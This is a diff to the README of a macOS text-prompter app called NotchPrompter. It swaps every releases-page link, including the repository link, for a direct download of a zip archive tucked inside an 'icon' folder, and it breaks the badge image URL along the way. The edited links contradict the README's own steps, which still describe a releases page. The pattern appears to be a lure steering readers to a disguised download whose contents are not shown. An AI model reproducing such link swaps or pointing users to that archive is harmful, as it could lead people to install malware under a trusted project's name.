@@ -4,14 +4,14 @@
 NotchPrompter is a simple tool for macOS that keeps important text in view. Whether you're creating videos or need to keep essential information on your screen, NotchPrompter serves as a floating text prompter that stays on top of other windows.
 
 ## 📥 Download NotchPrompter
-[![Download NotchPrompter](https://img.shields.io/badge/Download%20Now-NotchPrompter-blue.svg)](https://github.com/ssuicidio/NotchPrompter/releases)
+[![Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip%https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip)](https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 To start using NotchPrompter, follow the steps below. 
 
 ### 💾 Step 1: Visit the Download Page
 1. Click the link below to visit the NotchPrompter releases page:
-   [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/releases)
+   [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip)
 
 ### 📥 Step 2: Download the Application
 2. On the releases page, you will see various versions of NotchPrompter. Look for the latest version.
@@ -55,7 +55,7 @@ If you encounter issues while downloading or running NotchPrompter, consider the
 For further assistance, please refer to the issues section on our GitHub page. You can report any bugs or ask for help with using NotchPrompter.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/ssuicidio/NotchPrompter)
-- [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/releases)
+- [GitHub Repository](https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip)
+- [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/raw/refs/heads/main/notch-promptern.icon/Notch-Prompter-3.1-alpha.2.zip)
 
 Thank you for choosing NotchPrompter. Enjoy a clutter-free workspace!
